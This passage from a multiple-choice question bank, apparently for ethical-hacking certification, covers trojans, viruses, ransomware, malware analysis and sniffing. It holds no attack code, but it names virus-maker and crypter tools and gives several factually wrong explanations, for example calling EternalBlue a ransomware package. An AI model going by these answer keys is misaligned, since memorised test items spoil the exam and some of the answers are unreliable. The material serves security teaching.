243. A computer installed with port monitoring, file monitoring, network monitoring, and antivirus software and connected to network only under strictly controlled conditions is known as:
+ [ ] Sandbox
+ [x] Sheep Dip
+ [ ] Malwarebytes
+ [ ] Droidsheep
> **Explanation:**
> **Sheep Dip:** Sheep dipping refers to the analysis of suspect files, incoming messages, etc. for malware. The users isolate the sheep-dipped computer from other computers on the network to block any malware from entering the system. Before performing this process, it is important to save all downloaded programs on external media such as CD-ROMs or DVDs. A computer used for sheep dipping should have tools such as port monitors, files monitors, network monitors, and one or more anti-virus programs for performing malware analysis of files, applications, incoming messages, external hardware devices (such as USB, Pen drive, etc.), and so on.
> 
> **Droidsheep:** DroidSheep tool is a used for session hijacking on Android devices connected on common wireless network. It gets the session ID of active user on Wi-Fi network and uses it to access the website as an authorized user. The droidsheep user can easily see what the authorized user is doing or seeing on the website. It can also hijack the social account by obtaining the session ID.
> 
> **Sandbox:** App sandboxing is a security mechanism that helps protect systems and users by limiting resources the app can access to its intended functionality on the mobile platform. Often, sandboxing is useful in executing untested code or untrusted programs from unverified third parties, suppliers, untrusted users, and untrusted websites. This is to enhance security by isolating an application to prevent intruders, system resources, malwares such as Trojans and viruses, and other applications from interacting with the protected app.
> 
> **Malwarebytes:** It is a tool for Windows operating system that provides comprehensive security that blocks malware and hackers. It protects you from threats that traditional antivirus isn't smart enough to stop.

244. Javier works as a security analyst for a small company. He has heard about a new threat; a new malware that the antivirus does not detect yet. Javier has the hash for the new virus. What can Javier do to proactively protect his company?
+ [x] Block with the antivirus anything that presents the same hash of the malware
+ [ ] Send the hash information to the antivirus company
+ [ ] Wait for the antivirus company to release a new version
+ [ ] Generate his own new version of the antivirus with the malware hash
> **Explanation:**
> All the answers are plausible but the only one that acts proactively in favor of the company is to block the hash in the antivirus software. For the other options, Javier must wait.

245. Which of the following terms is used to refer the technique that uses aggressive SEO tactics such as keyword stuffing, doorway pages, page swapping, and adding unrelated keywords to get higher search engine ranking for their malware pages?
+ [x] Blackhat Search Engine Optimization (SEO)
+ [ ] Drive-by Downloads
+ [ ] Spear Phishing
+ [ ] Malvertising
> **Explanation:**
> **Drive-by Downloads:** The unintentional downloading of software via the Internet. Here, an attacker exploits flaws in browser software to install malware just merely by visiting a website.
> 
> **Blackhat Search Engine Optimization (SEO):** Blackhat SEO (also referred to as unethical SEO) uses aggressive SEO tactics such as keyword stuffing, doorway pages, page swapping, and adding unrelated keywords to get higher search engine ranking for their malware pages.
> 
> **Malvertising:** Involves embedding malware-laden advertisements in legitimate online advertising channels to spread malware onto the systems of unsuspecting users.
> 
> **Spear Phishing:** Instead of sending thousands of emails, some attackers opt for “spear phishing” and use specialized social engineering content directed at a specific employee or small group of employees in a particular organization to steal sensitive data such as financial information and trade secrets. Spear phishing messages seems to be from a trusted source with an official-looking website. The email also appears to be from an individual from the recipient's company, generally someone in position of authority. But the message is actually sent by an attacker attempting to obtain critical information about a specific recipient and his/her organization, such as login credentials, credit card details, bank account numbers, passwords, confidential documents, financial information, and trade secrets.

246. Which component of the malware conceals the malicious code via various techniques, thus making it hard for security mechanisms to detect or remove it?
+ [ ] Payload
+ [ ] Crypter
+ [ ] Downloader
+ [x] Obfuscator
> **Explanation:**
> **Downloader:** Type of Trojan that downloads other malware (or) malicious code and files from the Internet on to the PC or device. Usually, attackers install downloader when they first gain access to a system.
> 
> **Crypters:** Crypter is a software that encrypts the original binary code of the .exe file. Attackers use crypters to hide viruses, spyware, keyloggers, Remote Access Trojans (RATs), among others, to make them undetectable by anti-viruses.
> 
> **Obfuscator:** Obfuscation means to make code harder to understand or read, generally for privacy or security purposes. A tool called an obfuscator converts a straightforward program into that works the same way but is much harder to understand. It is a program to conceal the malicious code of malware via various techniques, thus making it hard for security mechanisms to detect or remove it.
> 
> **Payload:** Part of the malware that performs desired activity when activated. The payload may be used for deleting, modifying files, affecting the system performance, opening ports, changing settings, etc. as part of compromising the security.

247. How does an attacker perform a “social engineered clickjacking” attack?
+ [x] By injecting malware into legitimate-looking websites to trick users by clicking them
+ [ ] By attaching a malicious file to an e-mail and sending the e-mail to a multiple target address
+ [ ] By mimicking legitimate institutions, such as banks, in an attempt to steal passwords and credit card
+ [ ] By exploiting flaws in browser software to install malware merely by visiting a website
> **Explanation:**
> In social engineered clickjacking technique, attackers inject malware into legitimate-looking websites to trick users by clicking them. When clicked, the malware embedded in the link executes without the knowledge or consent of the user.


## Trojans, Their Types, and How They Infect Systems
248. Tina downloaded and installed a 3D screensaver. She is enjoying watching the 3D screensaver, but whenever the screensaver gets activated, her computer is automatically scanning the network and sending the results to a different IP address on the network. Identify the malware installed along with the 3D screensaver?
+ [ ] Virus
+ [ ] Worm
+ [ ] Beacon
+ [x] Trojan Horse
> **Explanation:**
> **Trojan Horse:** Trojans get activated upon users’ specific predefined actions like installing a malicious software unintentionally, clicking on the malicious link, etc. and upon activation, it can grant attackers unrestricted access to all data stored on compromised information systems and causing potentially immense damage. A Trojan is wrapped within or attached to a legitimate program, meaning that the program may have functionality that is not apparent to the user. Also, attackers use victims as unwitting intermediaries to attack others.
> 
> A Trojan Horse is the best answer. It is often disguised as another program. The other answers may seem correct too but since it was in disguise, Trojan Horse is the best answer.
> 
> **Virus:** Viruses can attack a target host’s system using a variety of methods. They can attach themselves to programs and transmit themselves to other programs by making use of specific events. Viruses need such events to take place since they cannot self-start, infect hardware, or transmit themselves using non-executable files. “Trigger” and “direct attack” events can cause a virus to activate and infect the target system when the user triggers attachments received through email, Web sites, malicious advertisements, flash cards, pop-ups and so on. The virus can then attack a system’s built-in programs, antivirus software, data files, and system startup settings among others.
> 
> **Worm:** Computer worms are standalone malicious programs that replicate, execute, and spread across network connections independently, without human intervention. Intruders design most worms to replicate and spread across a network, thus consuming available computing resources and in turn causing network servers, web servers, and individual computer systems to become overloaded and stop responding. However, some worms also carry a payload to damage the host system.
> 
> **Beacon:** It is type of frame transmitted by access points to indicate that it is working and on. These frames are like signals that can be captured by other devices in the wireless networks.

249. Which of the following ports does Tiny Telnet Server Trojan use?
+ [ ] 21
+ [ ] 22
+ [x] 23
+ [ ] 20
> **Explanation:**
> Tiny Telnet Server Trojan uses port number 23.

250. Which of the following Trojans uses port number 1863 to perform attack?
+ [ ] Millennium
+ [ ] Priority
+ [ ] Devil
+ [x] XtremeRAT
> **Explanation:**
> XtremeRAT uses port number 1863 as a corresponding port for attack.

251. Which of the following Trojan construction kits is used to create user-specified Trojans by selecting from the various options available?
+ [x] DarkHorse Trojan Virus Maker
+ [ ] Win32.Trojan.BAT
+ [ ] Trojan.Gen
+ [ ] Senna Spy Trojan Generator
> **Explanation:**
> **Trojan.Gen:** Trojan.Gen is a generic detection for many individual but varied Trojans for which specific definitions have not been created. A generic detection is used because it protects against many Trojans that share similar characteristics.
> 
> **Senna Spy Trojan Generator:** This is a Trojan that comes hidden in malicious programs. Once you install the source (carrier) program is installed, this Trojan attempts to gain "root" access (administrator level access) to your computer without your knowledge.
> 
> **DarkHorse Trojan Virus Maker:** DarkHorse Trojan Virus Maker is used to creates user-specified Trojans by selecting from various options available. The Trojans created to act as per the options selected while creating them. For e.g., if you choose the option Disable Process, the Trojan disables all processes on the target system. The screenshot in the slide shows a snapshot of Dark Horse Trojan Virus Maker that displays its various available options.
> 
> **Win32.Trojan.BAT:** Win32.Trojan.BAT is a system-destructive trojan program. It will crash the system by deleting files.

252. Which of the following is a program that is installed without the user’s knowledge and can bypass the standard system authentication or conventional system mechanism like IDS, firewalls, etc. without being detected?
+ [ ] Proxy Server Trojans
+ [ ] Remote Access Trojans
+ [x] Backdoor Trojans
+ [ ] Covert Channel Trojans
> **Explanation:**
> **Remote Access Trojans:** Remote access Trojans (RATs) provide attackers with full control over the victim’s system, enabling them to remotely access files, private conversations, accounting data, and others. The RAT acts as a server and listens on a port that is not supposed to be available to Internet attackers.
> 
> **Proxy Server Trojans:** Trojan-Proxy is usually a standalone application that allows remote attackers to use the victim’s computer as a proxy to connect to the Internet. Proxy server Trojan, when infected, starts a hidden proxy server on the victim’s computer. Attackers use it for anonymous Telnet, ICQ, or IRC to purchase goods using stolen credit cards, as well as other such illegal activities.
> 
> **Backdoor Trojans:** A backdoor is a program which can bypass the standard system authentication or conventional system mechanism like IDS, firewalls, etc. without being detected. In these types of breaches, hackers leverage backdoor programs to access the victim’s computer or a network. The difference between this type of malware and other types of malware is that the installation of the backdoor is performed without the user’s knowledge. This allows the attack to perform any activity on the infected computer which can include transferring, modifying, corrupting files, installing malicious software, rebooting the machine, etc. without user detection.
> 
> **Covert Channel Trojans:** Covert Channel Tunneling Tool (CCTT) Trojan presents various exploitation techniques, creating arbitrary data transfer channels in the data streams authorized by a network access control system. It enables attackers to get an external server shell from within the internal network and vice-versa. It sets a TCP/UDP/HTTP CONNECT|POST channel allowing TCP data streams (SSH, SMTP, POP, etc.) between an external server and a box from within the internal network.

253. Identify the Trojan which exhibits the following characteristics:
+ Login attempts with 60 different factory default username and password pairs
+ Built for multiple CPU architectures (x86, ARM, Sparc, PowerPC, Motorola)
+ Connects to CnC to allows the attacker to specify an attack vector
+ Increases bandwidth usage for infected bots
+ Identifies and removes competing malware
+ [ ] Ramnit
+ [ ] PlugBot
+ [ ] Windigo
+ [x] Mirai
> **Explanation:**
> Mirai is a self-propagating botnet that infects poorly protected internet devices (IoT devices). Mirai uses Telnet Port (23 or 2323) to find those devices that are still using their factory default username and password. Most of the IoT devices use default usernames and passwords and Mirai botnet has the ability to infect such multiple insecure devices and co-ordinate them to mount a DDoS attack against a chosen victim.

254. A hacker wants to encrypt and compress 32-bit executables and .NET apps without affecting their direct functionality. Which of the following cryptor tools should be used by the hacker?
+ [x] BitCrypter
+ [ ] Cypherx
+ [ ] Java crypter
+ [ ] Hidden sight crypter
> **Explanation:**
> An attacker can use BitCrypter to encrypt and compress 32-bit executables and .NET apps, without affecting their direct functionality. A Trojan or malicious software piece can be encrypted onto a legitimate software to bypass firewalls and antivirus software. BitCrypter supports a wide range of OSs from Windows XP to the latest Windows 10.

255. Which of the following is not a remote access Trojan?
+ [x] Wingbird
+ [ ] Theef
+ [ ] Kedi RAT
+ [ ] Netwire
> **Explanation:**
> Remote access Trojans (RATs) provide attackers with full control over the victim’s system, enabling them to remotely access files, private conversations, accounting data, and others. All are remote access Trojans except for Wingbird which is a Rootkit Trojan.

256. What is the sole purpose of writing destructive Trojans?
+ [ ] To stop the working of security programs such as firewall and IDS
+ [x] To randomly delete files, folders, registry entries, and local and network drives
+ [ ] To trick the victim to install the malicious application
+ [ ] To copying itself to the system and create a scheduled task that executes the copied payload
> **Explanation:**
> The sole purpose of writing destructive Trojans is to delete files on a target system. Antivirus software may not detect destructive Trojans. Once a destructive Trojan infects a computer system, it randomly deletes files, folders, registry entries, and local and network drives often resulting in OS failures.

257. Which of the following is a legal channel for the transfer of data or information in a company network securely?
+ [ ] Covert Storage Channel
+ [ ] Covert Channel
+ [ ] Covert Timing Channel
+ [x] Overt Channel
> **Explanation:**
> **Overt Channel:** An overt channel is a legal channel for the transfer of data or information in a company network and works securely to transfer data and information.
> 
> **Covert Channel:** A covert channel is an illegal, hidden path used to transfer data from a network. Covert channels are methods attackers can use to hide data in an undetectable protocol.
> 
> **Covert Storage Channel/Covert Timing Channel:** Covert channels are categorized as covert storage channel and covert timing channel. A covert storage channel transmits information where one program sets the bits and another program reads those bits. That is the information is transmitted in an encoded form. On the other hand the covert timing channel transmits information by modulating or changing some feature of the system behavior over time and the receiving system detects the system behavior and understands the encoded information.


## Viruses, Their Types, and How They Infect Files
258. Which of the following programs is usually targeted at Microsoft Office products?
+ [ ] Polymorphic virus
+ [ ] Multipart virus
+ [x] Macro virus
+ [ ] Stealth virus
> **Explanation:**
> Macro virus infects Microsoft Word or similar applications, which automatically perform a sequence of actions after triggering an application. Most macro viruses are written using macro language visual basic for applications (VBA), and they infect templates or convert infected documents into template files while maintaining their appearance of ordinary document files.

259. Which of the following viruses tries to hide from anti-virus programs by actively altering and corrupting the chosen service call interruptions when they are being run?
+ [ ] Polymorphic virus
+ [ ] Cavity virus
+ [ ] Metamorphic virus
+ [x] Stealth virus
> **Explanation:**
> **Cavity virus:** Some programs have empty spaces in them. Cavity Virus, also known as a space-filler overwrites a part of the host file that is with a constant (usually nulls), without increasing the length of the file but preserving its functionality. Maintaining constant file size when infecting allows it to avoid detection. The cavity viruses are rarely found due to the unavailability of hosts and due to the code complexity in writing.
> 
> **Polymorphic virus:** This type of virus infects a file with an encrypted copy of a polymorphic code already decoded by a decryption module. Polymorphic viruses modify their code for each replication to avoid detection. They accomplish this by changing the encryption module and the instruction sequence. Polymorphic mechanisms use random number generators in their implementation.
> 
> **Metamorphic virus:** Metamorphic viruses are programmed in such a way that they rewrite themselves completely each time they infect a new executable file. Such viruses are sophisticated and use metamorphic engines for their execution. Metamorphic code reprograms itself. It is translated into temporary code (a new variant of the same virus but with a different code), and then converted back to the original code.
> 
> **Stealth virus:** These viruses try to hide from antivirus programs by actively altering and corrupting the service call interrupts while running. The virus code replaces the requests to perform operations with respect to these service call interrupts. These viruses state false information to hide their presence from antivirus programs. For e.g., the stealth virus hides the operations that it modified and gives false representations. Thus, it takes over portions of the target system and hides its virus code.

260. Which of the following malware is a self-replicating program that produces its code by attaching copies of itself to other executable codes and operates without the knowledge of the user?
+ [x] Virus
+ [ ] Worm
+ [ ] Trojan
+ [ ] Exploit kit
> **Explanation:**
> **Exploit Kit:** An exploit kit or crimeware toolkit is used to exploit security loopholes found in software applications such as Adobe Reader, Adobe Flash Player, etc. by distributing malware such as spyware, viruses, Trojans, worms, bots, backdoors, buffer overflow scripts, or other payloads to the target system.
> 
> **Worm:** Computer worms are standalone malicious programs that replicate, execute, and spread across network connections independently, without human intervention.
> 
> **Trojan:** A computer trojan is a program in which the malicious or harmful code is contained inside apparently harmless programming or data in such a way that it can get control and cause damage, such as ruining the file allocation table on your hard disk.
> 
> **Virus:** A computer virus is a self-replicating program that produces its code by attaching copies of itself to other executable codes and operates without the knowledge or desire of the user. Like a biological virus, a computer virus is contagious and can contaminate other files; however, viruses can infect outside machines only with the assistance of computer users. Some viruses affect computers as soon as their code is executed; other viruses lie dormant until a pre-determined logical circumstance is met. Viruses infect a variety of files, such as overlay files (.OVL) and executable files (.EXE, .SYS, .COM or .BAT). Viruses are transmitted through file downloads, infected disk/flash drives, and as email attachments.

261. Which of the following tools is an antivirus program that is used to detect viruses?
+ [x] ClamWin
+ [ ] ZeuS
+ [ ] DriverView
+ [ ] WannaCry
> **Explanation:**
> **ClamWin:** ClamWin is a Free Antivirus program for Microsoft Windows 10 / 8 / 7 / Vista / XP / Me / 2000 / 98 and Windows Server 2012, 2008 and 2003.
> 
> **WannaCry:** WannaCry is ransomware that on execution encrypts the files and locks the user's system thereby leaving the system in an unusable state. The compromised user has to pay ransom in bitcoins to the attacker to unlock the system and get the files decrypted.
> 
> **ZeuS:** ZeuS, also known as Zbot, is a powerful banking trojan that explicitly attempts to steal confidential information like system information, online credentials, and banking details, etc. Zeus is spread mainly through drive-by downloads and phishing schemes.
> 
> **DriverView:** DriverView utility displays the list of all device drivers currently loaded on the system. For each driver in the list, additional information is displayed such as load address of the driver, description, version, product name, company that created the driver, etc.

262. During malware reverse engineering and analysis, Sheena has identified following characteristics present in the malware:  
	+ Self-replicating  
	+ Reprograms itself  
	+ Cannot be detected by antivirus  
	+ Changes the malicious code with each infection
What is the type of malware identified by Sheena?
+ [ ] Metamorphic Virus
+ [ ] Botnet Trojan
+ [x] Polymorphic Virus
+ [ ] Covert Channel Trojan
> **Explanation:**
> **Polymorphic virus:** Decrypting engine decrypts the virus code before execution. During each infection, the mutation engine builds a new code of virus with a complete different functionality. Then, the actual code and mutation engine both are encrypted for the next infection.  
>   
> **Metamorphic virus:** The virus rewrites itself at each time of infection. Original algorithm and functionality remains intact but a variant of the same virus is created.  
> 
> **Covert Channel Trojan:** This creates an arbitrary data transfer channel in data streams authorized by the network access control system.  
> 
> **Botnet Trojan:** Botnet Trojan infects large number of computers to create a network of bots that is controlled through the C&C center.

263. NotPetya ransomware targets all the versions of Windows OSs and can infect the entire network, including known server names. Which of the following statement is true for NotPetya?
+ [ ] It is a dreadful data encrypting parasite that not only infects the computer system but also has the ability to corrupt data on unmapped network shares.
+ [ ] It spreads through an exposed, vulnerable SMB port instead of phishing or social engineering.
+ [x] It can spread over the network using WMIC (Windows Management Instrumentation Command-line) by capturing all credentials from the local machine using Mimikatz.
+ [ ] It spreads as a malicious Word document named invoice J-[8 random numbers].doc that is attached to spam emails.
> **Explanation:**
> NotPetya infects the master boot record to execute a payload that encrypts a hard drive’s file system table and stops Windows from booting. It can spread over the network using WMIC (Windows Management Instrumentation Command-line) by capturing all credentials from the local machine using Mimikatz.
> 
> This ransomware follows the footsteps of Wannacry that encrypts computer files and demands a ransom of $300 Bitcoins to decrypt the data. This attack had been initiated against an update, used on a third party Ukrainian software called MeDoc, which is used by many government organizations.

264. Which virus has the following characteristics:  
+ Inserts dead code  
+ Reorders instructions  
+ Reshapes the expressions  
+ Modifies program control structure
+ [ ] Stealth Virus
+ [x] Metamorphic Virus
+ [ ] Macro Virus
+ [ ] Cluster Virus
> **Explanation:**
> **Metamorphic virus:** The virus rewrites itself at each time of infection. Original algorithm and functionality remains intact but a variant of the same virus is created.  
> 
> **Stealth virus:** It hides itself from antivirus programs by actively altering and corrupting service call interrupts.  
> 
> **Cluster virus:** The virus has only a single copy of virus in hard disk but modifies directory table entries of each file, so that each user or system process points to virus code instead of the original program.  
> 
> **Macro virus:** The virus infects Microsoft Word or similar Microsoft products, which automatically performs a sequence of actions after triggering an application, using VBA scripts.

265. Which of the following ransomware is a dreadful data-encrypting parasite that not only infects the computer system but also has the ability to corrupt data on unmapped network shares?
+ [ ] Petya –NotPetya
+ [x] Locky
+ [ ] WannaCry
+ [ ] Mischa
> **Explanation:**
> **WannaCry:** WannaCry is ransomware that on execution encrypts the files and locks the user's system thereby leaving the system in an unusable state. The compromised user has to pay ransom in bitcoins to the attacker to unlock the system and get the files decrypted.
> 
> **Petya –NotPetya:** This ransomware targets all the versions of Windows OSs and can infect the entire network, including known server names. The master boot record is infected to execute a payload that encrypts a hard drive’s file system table and stops Windows from booting. It can spread over the network using WMIC (Windows Management Instrumentation Command-line) by capturing all credentials from the local machine using Mimikatz.
> 
> **Mischa:** The Mischa Ransomware is the standard garden variety ransomware that encrypts your files and then demands a ransom payment to get the decryption key.
> 
> **Locky:** Locky is a dreadful data encrypting parasite that not only infects the computer system but also has the ability to corrupt data on unmapped network shares. This ransomware spreads as a malicious Word document named invoice J-[8 random numbers].doc that is attached to spam emails.

266. Which of the following viruses infect only occasionally upon satisfying certain conditions or when the length of the file falls within a narrow range?
+ [ ] Stealth virus
+ [ ] Cluster viruses
+ [x] Sparse infector viruses
+ [ ] Encryption viruses
> **Explanation:**
> **Cluster viruses:** Cluster viruses infect files without changing the file or planting additional files. They save the virus code to the hard drive and overwrite the pointer in the directory entry, directing the disk read point to the virus code instead of the actual program.
> 
> **Sparse infector viruses:** To spread infection, viruses typically attempt to hide from antivirus programs. Sparse infector viruses infect less often and try to minimize the probability of discovery. Sparse infector viruses infect only occasionally upon satisfying certain conditions or only files whose lengths fall within a narrow range.
> 
> **Encryption viruses:** Encryption viruses block the access to target machines or provide victims with limited access to the system. This virus uses encryption to hide from virus scanner. It is not possible for the virus scanner to detect the encryption virus using signatures, but it can detect the decrypting module. They penetrate the target system via freeware, shareware, codecs, fake advertisements, torrents, email spam, and so on.
> 
> **Stealth virus:** These viruses try to hide from antivirus programs by actively altering and corrupting the service call interrupts while running. The virus code replaces the requests to perform operations with respect to these service call interrupts. These viruses state false information to hide their presence from antivirus programs.

267. Rita is a security analyst in a firm and wants to check a new antivirus software by creating a virus so as to auto start and shutdown a system. Identify the virus maker tool she should use to check the reliability of new anti-virus software?
+ [x] JPS Virus Maker
+ [ ] WannaCry
+ [ ] VirusTotal
+ [ ] DELmE’s Batch Virus Generator
> **Explanation:**
> **DELmE’s Batch Virus Generator:** DELmE’s Batch Virus Generator is a virus creation program with lots of options to infect the victim’s PC such as formatting C: drive, deleting all files in Hard Disk drive, disabling admin privileges, cleaning registry, changing the home page, killing tasks, disabling/removing antivirus and firewall, etc.
> 
> **JPS Virus Maker:** JPS Virus Maker tool is used to create the own customized virus. There are many options in build in this tool which can be used to create the virus. Some of the features of this tool are auto start, shutdown, disable security center, lock mouse and keyboard, destroy protected storage, and terminate windows.
> 
> **WannaCry:** WannaCry is ransomware that on execution encrypts the files and locks the user's system thereby leaving the system in an unusable state. The compromised user has to pay ransom in bitcoins to the attacker to unlock the system and get the files decrypted.
> 
> **VirusTotal:** VirusTotal is a free service that analyzes suspicious files and URLs and facilitates the detection of viruses, worms, Trojans, etc. It generates a report that provides the total number of engines that marked the file as malicious, the malware name, and if available, additional information about the malware.


## Malware Analysis and Countermeasures
268. Marina is a malware analyst with a bank in London. One day, she suspects a file to be a malware and tries to perform static analysis to identify its nature. She wants to analyze the suspicious file and extract the embedded strings in the file into a readable format. Which of the following tool can she use to perform this task?
+ [ ] ASPack
+ [x] BinText
+ [ ] UPX
+ [ ] PE Explorer
> **Explanation:**
> BinText is a small text extractor utility that can extract text from any kind of file and includes the ability to find plain ASCII text, Unicode (double byte ANSI) text and Resource strings, providing useful information for each item in the optional "advanced" view mode.  
> 
> UPX (Ultimate Packer for Executables) is a free and open source executable packer supporting a number of file formats from different operating systems.  
> 
> ASPack is an advanced EXE packer created to compress Win32 executable files and to protect them against non-professional reverse engineering.  
> 
> PE Explorer lets you open, view and edit a variety of different 32-bit Windows executable file types (also called PE files) ranging from the common, such as EXE, DLL and ActiveX Controls, to the less familiar types, such as SCR (Screensavers), CPL (Control Panel Applets), SYS, MSSTYLES, BPL, DPL and more (including executable files that run on MS Windows Mobile platform).

269. Which of the following analysis techniques involves going through the executable binary code without actually executing it to have a better understanding of the malware and its purpose?
+ [ ] Dynamic malware analysis
+ [ ] System baselining
+ [ ] Spectrum analysis
+ [x] Static malware analysis
> **Explanation:**
> **Spectrum Analysis:** An attacker can use spectrum analyzers to discover the presence of wireless networks. Spectrum analysis of wireless network helps an attacker to actively monitor the spectrum usage in a particular area and detect the spectrum signal of target network. It also helps the attacker to measure the power of the spectrum of known and unknown signals.
> 
> **Dynamic Malware Analysis:** It also known as behavioral analysis, involves executing the malware code to know how it interacts with the host system and its impact on it after infecting the system. Dynamic analysis involves execution of malware to examine its conduct, operations and identifies technical signatures that confirm the malicious intent.
> 
> **Static Malware Analysis:** It also known as code analysis, involves going through the executable binary code without actually executing it to have a better understanding of the malware and its purpose. The general static scrutiny involves analysis of malware without executing the code or instructions. The process includes use of different tools and techniques to determine the malicious part of the program or a file.
> 
> **System Baselining:** Baselining refers to the process of capturing system state (taking snapshot of the system) at the time the malware analysis begins that can be used to compare the system’s state after executing the malware file. This will help to understand the changes malware has made across the system. System baseline includes recording details of the file system, registry, open ports, network activity, etc.

270. Identify the monitoring tool that exhibits the following features:
+ Reliable capture of process details, including image path, command line, user and session ID.
+ Configurable and moveable columns for any event property.
+ Filters can be set for any data field, including fields not configured as columns.
+ Advanced logging architecture scales to tens of millions of captured events and gigabytes of log data.
+ Process tree tool shows the relationship of all processes referenced in a trace.
+ Native log format preserves all data for loading in a different Process Monitor instance
+ [ ] Netstat
+ [x] Process Monitor
+ [ ] IDA Pro
+ [ ] TCP View
> **Explanation:**
> **Process Monitor:** Process Monitor is a monitoring tool for Windows that shows real-time file system, Registry, and process/thread activity.
> 
> Features:
> + More data captured for operation input and output parameters.
> + Non-destructive filters allow you to set filters without losing data.
> + Capture of thread stacks for each operation makes it possible in many cases to identify the cause of an operation.
> + Reliable capture of process details, including image path, command line, user and session ID.
> + Configurable and moveable columns for any event property.
> + Filters can be set for any data field, including fields not configured as columns.
> + Advanced logging architecture scales to tens of millions of captured events and gigabytes of log data.
> + Process tree tool shows the relationship of all processes referenced in a trace.
> + Native log format preserves all data for loading in a different Process Monitor instance.
> 
> **Netstat:** It displays active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, IPv4 statistics (for the IP, ICMP, TCP, and UDP protocols), and IPv6 statistics (for the IPv6, ICMPv6, TCP over IPv6, and UDP over IPv6 protocols).
> 
> **TCPView:** TCPView is a Windows program that shows detailed listings of all TCP and UDP endpoints on the system, including the local and remote addresses, and the state of TCP connections. It provides a subset of the Netstat program that ship with Windows.
> 
> **IDA Pro:** IDA Pro is a multi-platform disassembler and debugger that explores binary programs, for which source code is not always available, to create maps of their execution. It shows the instructions in the same way as a processor executes them in a symbolic representation called assembly language. Thus, it is easy for you to find the harmful or malicious processes.

271. Ramon is a security professional for xsecurity. During an analysis process, he has identified a suspicious .exe file. Ramon executed the suspicious malicious file in a sandbox environment where the malware cannot affect other machines in the network. What type of analysis does Ramon conduct?
+ [ ] Static Malware Analysis
+ [ ] Sheep Dipping
+ [ ] Preparing Testbed
+ [x] Dynamic Malware Analysis
> **Explanation:**
> Dynamic malware analysis is also known as behavioral analysis, which involves executing the malware code to know how it interacts with the host system and its impact on the system after it has been infected. In dynamic analysis, the malware will be executed on a system to understand its behavior after infection.
>   
> This type of analysis requires safe environment such as virtual machines and sandboxes to deter the spreading of malware.

272. Which of the following processes refers to taking a snapshot of the system at the time the malware analysis begins?
+ [ ] Windows services monitoring
+ [ ] API call monitoring
+ [ ] Sandboxing
+ [x] System baselining
> **Explanation:**
> Baselining refers to the process of capturing system state (taking snapshot of the system) at the time the malware analysis begins that can be used to compare the system’s state after executing the malware file. This will help to understand the changes malware has made across the system. System baseline includes recording details of the file system, registry, open ports, network activity, and so on.

273. Which of the following .dll file is used by the Zeus Trojan to access and manipulate Service Manager and Registry on a victim machine?
+ [ ] User32.dll
+ [ ] n32dll.dll
+ [x] Advapi32.dll
+ [ ] Kernel32.dll
> **Explanation:**
> A ZeuS trojan consists of three main .dll files packed in UPX format, namely Kernel32.dll, Advapi32.dll, and user32.dll. These three .dll files are required by the trojan to perform the following actions:
> + Kernel32.dll – To access/manipulate memory files and hardware
> + Advapi32.dll – To access/manipulate Service Manager and Registry
> + User32.dll – To display and manipulate graphics
> 
> N32dll.dll: It is a type of DLL file associated with Third-Party Application developed by Windows Software Developer for the Windows Operating System.

274. Which of the following windows service vulnerability does the WannaCry ransomware exploit during the attack on any windows machine?
+ [ ] DNS
+ [x] SMB
+ [ ] SNMP
+ [ ] SMTP
> **Explanation:**
> WannaCry ransomware spreads through malicious e-mail attachments and also spreads across the same LAN by using a Windows SMB (server message block) vulnerability via port 445 (Microsoft Security Bulletin MS17-010). WannaCry uses the RSA AES encryption algorithm to encrypt contents on infected systems and change the wallpaper of the system desktop demanding payment in bitcoins.

275. Which of the following backdoors is used by the WannaCry ransomware to perform remote code execution and further propagation on a victim machine?
+ [ ] satanz
+ [ ] Kovter
+ [x] Doublepulsar
+ [ ] EternalBlue
> **Explanation:**
> Doublepulsar is the backdoor that is used by the WannaCry ransomware to perform remote code execution and further propagation on a victim machine. Eternalblue is a ransomware package that Wanacry uses for deploying the backdoor.

276. By conducting which of the following monitoring techniques can a security professional identify the presence of any malware that manipulates HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services registry keys to hide its processes?
+ [ ] Startup programs monitoring
+ [x] Windows services monitoring
+ [ ] Process monitoring
+ [ ] Registry monitoring
> **Explanation:**
> + Startup programs monitoring is used to detect suspicious startup programs and processes.
> + Registry monitoring is used examine the changes made to the system’s registry by malware.
> + Process monitoring is used to scan for suspicious processes.
> + Windows services monitoring traces malicious services initiated by the malware. Since malware employs rootkit techniques to manipulate HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services registry keys to hide its processes, windows service monitoring can be used to identify such manipulations.

277. In which of the following online services can a security analyst upload the suspicious file to identify whether the file is a genuine one or a malicious one?
+ [ ] domainsearch.com
+ [ ] Whois.com
+ [x] VirusTotal.com
+ [ ] Netcraft.com
> **Explanation:**
> Whois.com, Netcraft.com, and domainsearch.com are the online web services that are mostly used to identify the domain information about any organization. VirusTotal is an online web service that is effectively used to analyze suspicious files and URLs, and facilitates the detection of viruses, worms, Trojans, and so on.

# Sniffing
## Sniffing Concepts
278. A hacker was able to sniff packets on a company’s wireless network. The following information was discovered: the Key 10110010 01001011 and the Ciphertext 01100101 01011010.
Using the exclusive OR function, what was the original message?
+ [x] 11010111 00010001
+ [ ] 00101000 11101110
+ [ ] 00001101 10100100
+ [ ] 11110010 01011011
> **Explanation:**
> XOR or Exclusive OR function is a binary logical operation that results in true (1) only when one input is true (1) and the other is false (0). It returns false (0) when both the inputs are true (1) or false (0).
> 
> Example:
> + Key = 10110010 01001011
> + Ciphertext = 01100101 01011010
> + Plaintext or Original Message = 11010111 00010001

279. A tester is attempting to capture and analyze the traffic on a given network and realizes that the network has several switches. What could be used to successfully sniff the traffic on this switched network? (Choose three.)
+ [ ] SYN flooding
+ [x] MAC flooding
+ [ ] ARP broadcasting
+ [x] Address Resolution Protocol (ARP) spoofing
+ [x] MAC duplication
+ [ ] Reverse smurf attack
> **Explanation:**
> ARP spoofing is a technique by which an attacker sends (spoofed) ARP messages onto a local area network. In general, the aim is to associate the attacker’s MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead.
> 
> MAC duplication is executed by an attacker by changing the MAC address of their host to match the MAC address of the target host on the network, making the switch forward the target packets to both the host on the network.
> 
> MAC flooding is a technique employed to compromise the security of the network switches. Switches maintain a list (called a content addressable memory (CAM) table) that maps individual MAC addresses on the network to the physical ports on the switch.

280. Which of the following problems can be solved by using Wireshark?
+ [x] Troubleshooting communication resets between two systems
+ [ ] Tracking version changes of source code
+ [ ] Resetting the administrator password on multiple systems
+ [ ] Checking creation dates on all webpages on a server
> **Explanation:**
